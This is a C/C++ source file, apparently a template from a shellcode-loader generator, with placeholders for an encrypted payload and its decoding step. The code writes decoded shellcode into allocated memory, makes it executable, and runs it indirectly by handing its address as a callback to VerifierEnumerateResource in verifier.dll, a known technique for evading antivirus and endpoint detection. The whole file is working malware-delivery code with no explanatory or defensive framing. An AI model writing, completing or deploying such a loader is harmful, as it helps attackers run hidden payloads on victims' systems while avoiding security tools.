#include <windows.h>
#include <avrfsdk.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"


typedef ULONG(WINAPI* VerifierEnumResourceFn)(
	HANDLE Process,
	ULONG  Flags,
	ULONG  ResourceType,
	AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,
	PVOID  EnumerationContext
	);

char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>
	
	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	HMODULE lib = LoadLibraryW(L"verifier.dll");

	VerifierEnumResourceFn VerifierEnumResource;

	*(FARPROC*)&VerifierEnumResource = GetProcAddress(lib, "VerifierEnumerateResource");

	if (NULL == VerifierEnumResource)
	{
		printf("could not find entry point %s in verifier.dll\n",
			"VerifierEnumerateResource");
		return GetLastError();
	}

	VerifierEnumResource(::GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)addr, NULL);
}